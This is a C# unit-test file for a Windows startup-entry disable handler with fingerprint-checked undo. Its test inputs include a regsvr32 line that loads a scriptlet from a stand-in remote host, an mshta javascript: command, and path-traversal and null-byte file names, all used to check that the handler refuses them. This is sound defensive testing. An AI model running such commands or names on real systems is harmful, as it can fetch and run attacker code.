using System.Text.Json.Nodes;
using OptimizationTool.Engine.Actions;
using OptimizationTool.Windows.Actions.Settings;
using OptimizationTool.Windows.Actions.Startup;
using OptimizationTool.Windows.Tests.Actions.Settings;

namespace OptimizationTool.Windows.Tests.Actions.Startup;

/// <summary>An in-memory Startup folder, shortcuts and file hashes. Never touches the file system.</summary>
internal sealed class FakeStartupFiles : IStartupFiles
{
    public const string Folder = @"Q:\Users\pat\Start Menu\Programs\Startup";
    public string? FolderPath = Folder;
    public readonly Dictionary<string, string?> Files = new(StringComparer.OrdinalIgnoreCase); // path → sha256 (null: unreadable)
    public readonly Dictionary<string, ShortcutInfo> Shortcuts = new(StringComparer.OrdinalIgnoreCase);

    public const string CommonFolder = @"Q:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp";
    public string? UserStartupFolder() => FolderPath;
    public string? CommonStartupFolder() => CommonFolder;
    public IReadOnlyList<string> List(string folder) =>
        Files.Keys.Where(p => string.Equals(Path.GetDirectoryName(p), folder, StringComparison.OrdinalIgnoreCase)).Select(p => Path.GetFileName(p)).ToList();
    public bool Exists(string path) => Files.ContainsKey(path);
    public ShortcutInfo? ReadShortcut(string path) => Shortcuts.TryGetValue(path, out var s) ? s : null;
    public string? Sha256(string path) => Files.TryGetValue(path, out var h) ? h : null;
    /// <summary>path → signer (the broker reads it itself, m9 §3.7).</summary>
    public readonly Dictionary<string, string> Publishers = new(StringComparer.OrdinalIgnoreCase);
    public string? Publisher(string path) => Publishers.TryGetValue(path, out var p) ? p : null;

    /// <summary>A quoted image, or the text up to the first space; the payload of a host process as the real one finds it.</summary>
    public LaunchInfo ParseLaunch(string? command, string? workingDirectory)
    {
        if (string.IsNullOrWhiteSpace(command)) return new LaunchInfo(null, null, true);
        var s = command.Trim();
        string image, rest;
        if (s.StartsWith('"')) { var close = s.IndexOf('"', 1); image = s[1..close]; rest = s[(close + 1)..].Trim(); }
        else { var sp = s.IndexOf(' '); image = sp < 0 ? s : s[..sp]; rest = sp < 0 ? "" : s[(sp + 1)..].Trim(); }
        var (payload, identified) = OptimizationTool.Windows.Security.Common.LaunchString.HostedPayload(image, rest, workingDirectory, Exists, null);
        return new LaunchInfo(image, payload, identified);
    }
}

public class StartupDisableHandlerTests
{
    private const string App = @"Q:\Apps\Notes\notes.exe";
    private const string Hash = "1111111111111111111111111111111111111111111111111111111111111111";
    private const string Hash2 = "2222222222222222222222222222222222222222222222222222222222222222";
    private static readonly DateTimeOffset Now = new(2026, 11, 10, 9, 0, 0, TimeSpan.Zero);

    private sealed class FixedTime : TimeProvider
    {
        public override DateTimeOffset GetUtcNow() => Now;
    }

    private static (StartupDisableHandler H, FakeRegistryStore Reg, FakeStartupFiles Files) New()
    {
        var reg = new FakeRegistryStore();
        var files = new FakeStartupFiles();
        files.Files[App] = Hash;
        return (new StartupDisableHandler(reg, files, new FixedTime()), reg, files);
    }

    private static TargetEvidence Ev(string source, string location, string localName, string? signer = null, string collector = StartupDisableHandler.CollectorId) =>
        new("ev-1", collector, $"startup.{source}.{location}.0badc0de", new JsonObject
        {
            ["source"] = source, ["location"] = location, ["name"] = "Notes", ["signer"] = signer, ["enabled"] = true,
            ["entryKey"] = StartupKeys.Of(localName),
        }, "2026-11-10T08:00:00Z");

    private static ActionRequest Fresh(TargetEvidence? ev) => new(StartupDisableHandler.Id, null, null, null) { Evidence = ev };

    private static ActionExecution Exec(ActionResolution r) =>
        new("plan-1", "hash", Rt(r.Target), Rt(r.Before), Rt(r.After), null);

    /// <summary>Through JSON text, as the engine stores plans.</summary>
    private static JsonObject Rt(JsonObject o) => (JsonObject)JsonNode.Parse(o.ToJsonString())!;

    private static RegLocation Approved(string kind, string name) => StartupDisableHandler.Approved(kind, name);

    private static byte[]? Switch(FakeRegistryStore reg, string kind, string name) =>
        reg.Read(Approved(kind, name)) is { Present: true, Type: "binary" } d ? Convert.FromBase64String(d.Data!.GetValue<string>()) : null;

    [Fact]
    public void Metadata_matches_the_contract()
    {
        var (h, _, _) = New();
        Assert.Equal("startup.disable", h.ActionId);
        Assert.Equal("none", h.Privilege);
        Assert.True(h.SupportsUndo);
        Assert.Empty(h.Flags);
        Assert.Null(h.ParameterSchema);
        Assert.Equal("startup entry", ((IActionHandler)h).TargetKind);
        Assert.Contains(WindowsModules.Actions, m => m is StartupActionModule);
    }

    [Fact]
    public async Task Run_entry_is_switched_off_with_Explorers_value_and_undo_restores_it_while_the_fingerprint_matches()
    {
        var (h, reg, files) = New();
        reg.Set(StartupDisableHandler.Run("Notes Helper"), RegData.String($"\"{App}\" --tray"));
        var r = h.Resolve(Fresh(Ev("run", "hkcu", "Notes Helper", "Contoso Ltd")));
        Assert.True(r.Eligible, r.IneligibleMessage);
        Assert.Equal("Notes Helper", r.Target["name"]!.GetValue<string>());
        Assert.Equal("run", r.Target["kind"]!.GetValue<string>());
        Assert.True(r.Before["enabled"]!.GetValue<bool>());
        Assert.False(r.After["enabled"]!.GetValue<bool>());
        var fp = r.Before["fingerprint"]!;
        Assert.Equal($"\"{App}\" --tray", fp["command"]!.GetValue<string>());
        Assert.Equal(Hash, fp["imageSha256"]!.GetValue<string>());
        Assert.NotEqual(false, r.UndoSupported);
        Assert.Contains(r.Rows, row => row.Before == "Notes Helper"); // the user sees the name in the app
        Assert.DoesNotContain("Notes", r.IneligibleMessage ?? "");
        Assert.All(r.Resources!, k => Assert.True(ResourceKeys.Valid(k), k));
        Assert.Contains(@"reg:64:HKCU\SOFTWARE\MICROSOFT\WINDOWS\CURRENTVERSION\EXPLORER\STARTUPAPPROVED\RUN\NOTES HELPER", r.Resources!);

        var o = h.Execute(Exec(r));
        Assert.Equal("verified", o.State);
        Assert.DoesNotContain("Notes", o.ReceiptText); // the AI reads receipts
        var bytes = Switch(reg, "run", "Notes Helper")!;
        Assert.Equal(12, bytes.Length);
        Assert.Equal(3, bytes[0]);
        Assert.Equal(Now.UtcDateTime.ToFileTimeUtc(), BitConverter.ToInt64(bytes, 4));
        Assert.Equal($"\"{App}\" --tray", reg.Read(StartupDisableHandler.Run("Notes Helper")).Data!.GetValue<string>()); // the entry is untouched
        Assert.True(JsonNode.DeepEquals(o.Observed, await h.ReadTargetAsync(Rt(r.Target), default)));

        // Undo: engine-built, fingerprint unchanged → re-enable, flagged runs_code; rechecked again in the lock.
        var undo = h.UndoRequest(Rt(r.Target), Rt(r.Before))! with { Undo = true };
        var u = h.Resolve(undo);
        Assert.True(u.Eligible, u.IneligibleMessage);
        Assert.Contains(ActionFlags.RunsCode, u.Flags!);
        var recheck = h.Resolve(new ActionRequest(StartupDisableHandler.Id, Rt(u.Target), null, null) { Undo = true, Recheck = true });
        Assert.True(recheck.Eligible, recheck.IneligibleMessage);
        Assert.True(JsonNode.DeepEquals(u.Before, recheck.Before));
        Assert.Equal("verified", h.Execute(Exec(u)).State);
        Assert.Equal(2, Switch(reg, "run", "Notes Helper")![0]);
    }

    [Fact]
    public void Undo_is_refused_when_the_command_or_file_changed_or_was_already_turned_on()
    {
        var (h, reg, files) = New();
        reg.Set(StartupDisableHandler.Run("Notes"), RegData.String(App));
        var r = h.Resolve(Fresh(Ev("run", "hkcu", "Notes")));
        Assert.Equal("verified", h.Execute(Exec(r)).State);
        var undo = h.UndoRequest(Rt(r.Target), Rt(r.Before))! with { Undo = true };

        files.Files[App] = Hash2; // the program file was replaced
        var changed = h.Resolve(undo);
        Assert.Equal("changed_since", changed.IneligibleCode);
        Assert.Equal("ms-settings:startupapps", changed.ManualUri);

        files.Files[App] = Hash;
        reg.Set(StartupDisableHandler.Run("Notes"), RegData.String(App + " --evil")); // the command was edited
        Assert.Equal("changed_since", h.Resolve(undo).IneligibleCode);

        reg.Set(StartupDisableHandler.Run("Notes"), RegData.String(App));
        Assert.True(h.Resolve(undo).Eligible);
        // The fingerprint is checked again inside the lock: a change between preview and approval is refused.
        var u = h.Resolve(undo);
        files.Files[App] = Hash2;
        Assert.Equal("changed_since", h.Resolve(new ActionRequest(StartupDisableHandler.Id, Rt(u.Target), null, null) { Undo = true, Recheck = true }).IneligibleCode);

        files.Files[App] = Hash;
        reg.Set(Approved("run", "Notes"), RegData.Binary([2, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0]));
        Assert.Equal("already_set", h.Resolve(undo).IneligibleCode);

        // A forged undo target without the recorded fingerprint is not an undo.
        Assert.Equal("not_supported", h.Resolve(new ActionRequest(StartupDisableHandler.Id, Rt(r.Target), null, null) { Undo = true }).IneligibleCode);
    }

    [Fact]
    public void A_file_change_between_resolve_and_execute_means_the_entry_is_not_turned_on()
    {
        var (h, reg, files) = New();
        reg.Set(StartupDisableHandler.Run("Notes"), RegData.String(App));
        var r = h.Resolve(Fresh(Ev("run", "hkcu", "Notes")));
        Assert.Equal("verified", h.Execute(Exec(r)).State);
        var u = h.Resolve(h.UndoRequest(Rt(r.Target), Rt(r.Before))! with { Undo = true });
        Assert.True(u.Eligible, u.IneligibleMessage);
        files.Files[App] = Hash2; // replaced after the last recheck, before the write
        var o = h.Execute(Exec(u));
        Assert.Equal(("failed", "changed_since"), (o.State, o.Code));
        Assert.Equal(3, Switch(reg, "run", "Notes")![0]); // still off: nothing written

        // Turning on is never an ordinary change: an execution without the recorded fingerprint writes nothing.
        files.Files[App] = Hash;
        var forged = Exec(u);
        forged.Target.Remove("expect");
        Assert.Equal("changed_since", h.Execute(forged).Code);
        Assert.Equal(3, Switch(reg, "run", "Notes")![0]);
    }

    [Fact]
    public void No_readable_file_means_no_fingerprint_and_no_undo()
    {
        var (h, reg, files) = New();
        reg.Set(StartupDisableHandler.Run("Ghost"), RegData.String(@"Q:\Gone\ghost.exe"));
        var r = h.Resolve(Fresh(Ev("run", "hkcu", "Ghost")));
        Assert.True(r.Eligible);
        Assert.Equal(false, r.UndoSupported);
        Assert.Null(r.UndoConditions);
        var o = h.Execute(Exec(r));
        Assert.Equal("verified", o.State);
        Assert.Contains("Settings", o.ReceiptText); // the manual route
        Assert.Null(h.UndoRequest(Rt(r.Target), Rt(r.Before)));
    }

    [Fact]
    public void Startup_folder_shortcut_fingerprint_covers_target_arguments_and_files()
    {
        var (h, reg, files) = New();
        var lnk = Path.Combine(FakeStartupFiles.Folder, "Notes.lnk");
        files.Files[lnk] = Hash2;
        files.Shortcuts[lnk] = new ShortcutInfo(App, "--minimized", @"Q:\Apps\Notes");
        var r = h.Resolve(Fresh(Ev("folder", "user", "Notes.lnk")));
        Assert.True(r.Eligible, r.IneligibleMessage);
        var fp = r.Before["fingerprint"]!;
        Assert.Equal(App, fp["target"]!.GetValue<string>());
        Assert.Equal("--minimized", fp["arguments"]!.GetValue<string>());
        Assert.Equal(Hash, fp["imageSha256"]!.GetValue<string>());
        Assert.Equal(Hash2, fp["fileSha256"]!.GetValue<string>());
        Assert.Contains(r.Resources!, k => k.StartsWith("file:", StringComparison.Ordinal));
        Assert.Equal("verified", h.Execute(Exec(r)).State);
        Assert.Equal(3, Switch(reg, "folder", "Notes.lnk")![0]);
        Assert.True(files.Exists(lnk)); // never deleted

        var undo = h.UndoRequest(Rt(r.Target), Rt(r.Before))! with { Undo = true };
        files.Shortcuts[lnk] = new ShortcutInfo(App, "--minimized --run-this", @"Q:\Apps\Notes");
        Assert.Equal("changed_since", h.Resolve(undo).IneligibleCode);
    }

    private const string Rundll = @"Q:\Windows\System32\rundll32.exe";
    private const string Dll = @"Q:\Apps\Helper\helper.dll";
    private const string Hash3 = "3333333333333333333333333333333333333333333333333333333333333333";

    [Fact]
    public void Shortcut_through_rundll32_binds_the_dll_and_undo_is_refused_when_only_the_dll_changed()
    {
        var (h, _, files) = New();
        var lnk = Path.Combine(FakeStartupFiles.Folder, "Helper.lnk");
        files.Files[lnk] = Hash2;
        files.Files[Rundll] = Hash;
        files.Files[Dll] = Hash3;
        files.Shortcuts[lnk] = new ShortcutInfo(Rundll, $"\"{Dll}\",Start", null);
        var r = h.Resolve(Fresh(Ev("folder", "user", "Helper.lnk")));
        Assert.True(r.Eligible, r.IneligibleMessage);
        var fp = r.Before["fingerprint"]!;
        Assert.Equal(Dll, fp["payload"]!.GetValue<string>());
        Assert.Equal(Hash3, fp["payloadSha256"]!.GetValue<string>());
        Assert.NotEqual(false, r.UndoSupported);
        Assert.Equal("verified", h.Execute(Exec(r)).State);

        var undo = h.UndoRequest(Rt(r.Target), Rt(r.Before))! with { Undo = true };
        Assert.True(h.Resolve(undo).Eligible);
        files.Files[Dll] = Hash2; // only the DLL was replaced: shortcut, rundll32 and arguments are the same
        Assert.Equal("changed_since", h.Resolve(undo).IneligibleCode);
    }

    [Fact]
    public void Shortcut_payload_relative_to_its_working_folder_is_found_there()
    {
        var (h, _, files) = New();
        var lnk = Path.Combine(FakeStartupFiles.Folder, "Helper.lnk");
        files.Files[lnk] = Hash2;
        files.Files[Rundll] = Hash;
        files.Files[Dll] = Hash3;
        files.Shortcuts[lnk] = new ShortcutInfo(Rundll, "helper.dll,Start", @"Q:\Apps\Helper");
        var r = h.Resolve(Fresh(Ev("folder", "user", "Helper.lnk")));
        Assert.Equal(Dll, r.Before["fingerprint"]!["payload"]!.GetValue<string>());
        Assert.NotEqual(false, r.UndoSupported);
    }

    [Theory]
    [InlineData(@"Q:\Windows\System32\cmd.exe", "/c start notes.exe")]
    [InlineData(@"Q:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe", "-NoProfile -Command Start-Process notes")]
    [InlineData(@"Q:\Windows\System32\mshta.exe", "javascript:close()")]
    [InlineData(@"Q:\Windows\System32\regsvr32.exe", "/s /i:https://example.invalid/x.sct scrobj.dll")]
    [InlineData(Rundll, "helper.dll,Start")] // no working folder: the DLL can't be named
    [InlineData(Rundll, @"Q:\Apps\Gone\gone.dll,Start")] // named, but it can't be hashed
    public void Shortcut_whose_payload_cant_be_identified_or_hashed_offers_no_undo(string target, string arguments)
    {
        var (h, _, files) = New();
        var lnk = Path.Combine(FakeStartupFiles.Folder, "Helper.lnk");
        files.Files[lnk] = Hash2;
        files.Files[target] = Hash;
        files.Shortcuts[lnk] = new ShortcutInfo(target, arguments, null);
        var r = h.Resolve(Fresh(Ev("folder", "user", "Helper.lnk")));
        Assert.True(r.Eligible, r.IneligibleMessage);
        Assert.Equal(false, r.UndoSupported);
        Assert.Null(h.UndoRequest(Rt(r.Target), Rt(r.Before)));
    }

    [Fact]
    public void A_recorded_fingerprint_without_the_payload_fields_is_not_undoable()
    {
        var (h, _, files) = New();
        var lnk = Path.Combine(FakeStartupFiles.Folder, "Notes.lnk");
        files.Files[lnk] = Hash2;
        files.Shortcuts[lnk] = new ShortcutInfo(App, null, null);
        var r = h.Resolve(Fresh(Ev("folder", "user", "Notes.lnk")));
        Assert.NotNull(h.UndoRequest(Rt(r.Target), Rt(r.Before)));
        var before = Rt(r.Before);
        var fp = before["fingerprint"]!.AsObject();
        fp.Remove("payload");
        fp.Remove("payloadSha256");
        fp.Remove("payloadIdentified"); // as the earlier build recorded shortcuts
        Assert.Null(h.UndoRequest(Rt(r.Target), before));
    }

    [Fact]
    public void Ineligible_paths()
    {
        var (h, reg, files) = New();
        reg.Set(StartupDisableHandler.Run("Notes"), RegData.String(App));

        // No evidence, a raw target, or the wrong evidence: unknown_target.
        Assert.Equal(ActionService.UnknownTarget, h.Resolve(Fresh(null)).IneligibleCode);
        var raw = new ActionRequest(StartupDisableHandler.Id, new JsonObject { ["type"] = "startup_entry", ["kind"] = "run", ["name"] = "Notes", ["id"] = "run:" + StartupKeys.Of("Notes") }, null, null);
        Assert.Equal(ActionService.UnknownTarget, h.Resolve(raw).IneligibleCode);
        Assert.Equal(ActionService.UnknownTarget, h.Resolve(Fresh(Ev("run", "hkcu", "Notes", collector: "win.perf.sample"))).IneligibleCode);
        Assert.Equal(ActionService.UnknownTarget, h.Resolve(Fresh(Ev("run", "hkcu", "Notes") with { Subject = "startup.summary" })).IneligibleCode);
        var noKey = Ev("run", "hkcu", "Notes");
        noKey.Value["entryKey"] = "Notes";
        Assert.Equal(ActionService.UnknownTarget, h.Resolve(Fresh(noKey)).IneligibleCode);

        // Gone, already off, machine scope and other kinds.
        Assert.Equal("not_found", h.Resolve(Fresh(Ev("run", "hkcu", "Other"))).IneligibleCode);
        // ("run", "hklm") without view 64 is the 32-bit Run key: still unsupported.
        foreach (var (source, location) in new[] { ("run", "hklm"), ("runonce", "hkcu"), ("task", @"\Vendor"), ("service", "services") })
            Assert.Equal("unsupported", h.Resolve(Fresh(Ev(source, location, "Notes"))).IneligibleCode);
        Assert.Equal("not_found", h.Resolve(Fresh(Ev("folder", "common", "Notes.lnk"))).IneligibleCode); // all-users: m9 §3.2, admin scope
        reg.Set(Approved("run", "Notes"), RegData.Binary([3, 0, 0, 0, 1, 2, 3, 4, 5, 6, 7, 8]));
        Assert.Equal("already_set", h.Resolve(Fresh(Ev("run", "hkcu", "Notes"))).IneligibleCode);
        reg.Set(Approved("run", "Notes"), RegData.Dword(1));
        Assert.Equal("unexpected_value", h.Resolve(Fresh(Ev("run", "hkcu", "Notes"))).IneligibleCode);
        reg.Set(Approved("run", "Notes"), RegData.Absent);

        // Policy, protection and hardware limits.
        reg.Policies.Add(FakeRegistryStore.K(new RegLocation("HKCU", 64, @"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer", "DisableCurrentUserRun")));
        Assert.Equal("managed", h.Resolve(Fresh(Ev("run", "hkcu", "Notes"))).IneligibleCode);
        reg.Policies.Clear();
        reg.Set(StartupDisableHandler.Run("Afterburner"), RegData.String(@"""Q:\Program Files (x86)\MSI Afterburner\MSIAfterburner.exe"" /s"));
        Assert.Equal("hardware_limit", h.Resolve(Fresh(Ev("run", "hkcu", "Afterburner"))).IneligibleCode);
        reg.Set(StartupDisableHandler.Run("Updater"), RegData.String(@"Q:\x\updater.exe"));
        Assert.Equal("hardware_limit", h.Resolve(Fresh(Ev("run", "hkcu", "Updater", "EVGA Corporation"))).IneligibleCode);
        Assert.Equal("protected", h.Resolve(Fresh(Ev("run", "hkcu", "Updater", "Bitdefender SRL"))).IneligibleCode);
        reg.Set(StartupDisableHandler.Run("Optimus"), RegData.String(@"""Q:\Program Files\Optimus\OptimizationTool.Desktop.exe"" --tray"));
        Assert.Equal("protected", h.Resolve(Fresh(Ev("run", "hkcu", "Optimus"))).IneligibleCode);

        // Parameters are not taken.
        Assert.Equal("invalid_arguments", h.Resolve(Fresh(Ev("run", "hkcu", "Notes")) with { Parameters = new JsonObject { ["name"] = "x" } }).IneligibleCode);
    }

    [Theory]
    [InlineData(@"..\..\Windows\evil.lnk")]
    [InlineData(@"sub\Notes.lnk")]
    [InlineData("Notes.lnk\u0000.exe")]
    [InlineData("C:Notes.lnk")]
    public void Hostile_plan_targets_are_refused(string name)
    {
        var (h, _, files) = New();
        files.Files[Path.Combine(FakeStartupFiles.Folder, name)] = Hash;
        var target = new JsonObject { ["type"] = "startup_entry", ["kind"] = "folder", ["name"] = name, ["id"] = "folder:" + StartupKeys.Of(name) };
        Assert.Equal(ActionService.UnknownTarget, h.Resolve(new ActionRequest(StartupDisableHandler.Id, target, null, null) { Recheck = true }).IneligibleCode);
        Assert.Null(h.UndoRequest(target, new JsonObject()));
    }

    [Fact]
    public void A_target_whose_id_does_not_match_its_name_is_refused()
    {
        var (h, reg, _) = New();
        reg.Set(StartupDisableHandler.Run("Notes"), RegData.String(App));
        var forged = new JsonObject { ["type"] = "startup_entry", ["kind"] = "run", ["name"] = "Notes", ["id"] = "run:" + StartupKeys.Of("Other") };
        Assert.Equal(ActionService.UnknownTarget, h.Resolve(new ActionRequest(StartupDisableHandler.Id, forged, null, null) { Recheck = true }).IneligibleCode);
    }

    [Fact]
    public void Write_that_does_not_stick_is_failed_and_a_third_value_is_indeterminate()
    {
        var (h, reg, _) = New();
        reg.Set(StartupDisableHandler.Run("Notes"), RegData.String(App));
        var r = h.Resolve(Fresh(Ev("run", "hkcu", "Notes")));
        reg.OnWrite = _ => RegData.Binary([2, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0]);
        Assert.Equal("failed", h.Execute(Exec(r)).State);
        reg.OnWrite = _ => RegData.Dword(9);
        Assert.Equal("indeterminate", h.Execute(Exec(r)).State);
    }

    [Fact]
    public void Startup_collector_keeps_only_a_hash_of_the_entry_name()
    {
        var c = new OptimizationTool.Windows.Security.Collectors.StartupCollector(new OptimizationTool.Engine.CollectorOptions(),
            new OptimizationTool.Windows.Security.Common.PathRoots([("LOCALAPPDATA", @"Q:\Users\pat\AppData\Local")])) { UserName = "pat" };
        var valid = new OptimizationTool.Windows.Security.Common.SignatureInfo("valid", "Contoso Ltd", false);
        var r = c.Normalize(new OptimizationTool.Windows.Security.Collectors.StartupRaw(
        [
            new("run", "hkcu", "64", "pat helper", "REG_SZ", @"Q:\Users\pat\AppData\Local\Helper\helper.exe", true, null, valid, true, "logon", LocalKey: "pat helper"),
            new("folder", "user", null, "Notes", null, App, false, null, valid, true, "logon", LocalKey: "Notes.lnk"),
            new("task", @"\Vendor", null, "Updater", "exec", App, true, null, valid, true, "logon", LocalKey: @"\Vendor\Updater"),
            new("service", "services", null, "Contoso Agent", "ContosoAgent", App, false, null, valid, true, "boot", LocalKey: "ContosoAgent"),
            new("task", @"\Vendor", null, "NoKey", "exec", App, true, null, valid, true, "logon"),
        ], [], 0, 0, 0, 0, false));
        var run = r.Facts.Single(f => f.Subject.StartsWith("startup.run.", StringComparison.Ordinal));
        Assert.Equal(StartupKeys.Of("PAT HELPER"), run.Value["entryKey"]!.GetValue<string>()); // case-insensitive, like the registry
        Assert.Equal(StartupKeys.Of("Notes.lnk"), r.Facts.Single(f => f.Subject.StartsWith("startup.folder.", StringComparison.Ordinal)).Value["entryKey"]!.GetValue<string>());
        // m9 P3b-2: tasks key on the full task path, services on the service key name (service.disable, task.disable find them by it).
        var tasks = r.Facts.Where(f => f.Subject.StartsWith("startup.task.", StringComparison.Ordinal)).ToList();
        Assert.Contains(tasks, t => t.Value["entryKey"]?.GetValue<string>() == StartupKeys.Of(@"\Vendor\Updater"));
        Assert.Contains(tasks, t => t.Value["entryKey"] is null);
        Assert.Equal(StartupKeys.Of("ContosoAgent"), r.Facts.Single(f => f.Subject.StartsWith("startup.service.", StringComparison.Ordinal)).Value["entryKey"]!.GetValue<string>());
        Assert.DoesNotContain("pat", string.Join("\n", r.Facts.Select(f => f.Value.ToJsonString() + f.Display)));
    }
}
